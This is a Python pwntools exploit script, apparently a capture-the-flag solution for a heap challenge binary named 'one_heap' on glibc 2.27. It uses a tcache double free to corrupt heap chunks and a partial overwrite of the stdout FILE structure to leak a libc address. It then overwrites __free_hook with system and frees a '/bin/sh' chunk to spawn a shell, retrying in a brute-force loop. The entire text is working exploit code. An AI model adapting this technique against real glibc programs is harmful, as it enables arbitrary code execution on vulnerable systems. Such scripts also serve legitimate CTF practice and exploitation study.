from pwn import *

context.log_level = "debug"

bin = ELF("one_heap")
#libc = bin.libc
libc = ELF("libc-2.27.so")

def Debug(cmd=""):
    gdb.attach(p)
    #pause()

def add(size,content):
    p.sendlineafter("choice:", "1")
    p.sendlineafter("size:", str(size))
    p.sendlineafter("content:", content)

def delete():
    p.sendlineafter("choice:", "2")

def pwn(p):
    add(0x40,"")
    delete()
    delete()
    add(0x40,"\x10\x70")
    add(0x40,"")
    add(0x40,p64(0)*4+p64(0x0000000007000000))
    delete()
    add(0x40,"")
    add(0x18,p16(0x2760))
    #Debug()
    payload  = ""
    payload += p64(0xfbad3c80) #_flags= ((stdout->flags & ~ _IO_NO_WRITES)|_IO_CURRENTLY_PUTTING)|_IO_IS_APPENDING
    payload += p64(0)          #_IO_read_ptr
    payload += p64(0)          #_IO_read_end
    payload += p64(0)          #_IO_read_base
    payload += "\x08"          # overwrite last byte of _IO_write_base to point to libc address
    add(0x38,payload)
    libc.address = u64(p.recv(6)+'\x00\x00')-0x3ed8b0
    success("libc.address-->"+hex(libc.address))
    add(0x18,p64(0)+p64(libc.sym["__free_hook"]-8))
    add(0x7f,"/bin/sh\x00"+p64(libc.sym["system"]))
    delete()
    p.interactive()

while True:
    try:
        p = bin.process(env={"LD_PRELOAD":libc.path})
        pwn(p)
    except Exception as e:
        p.close()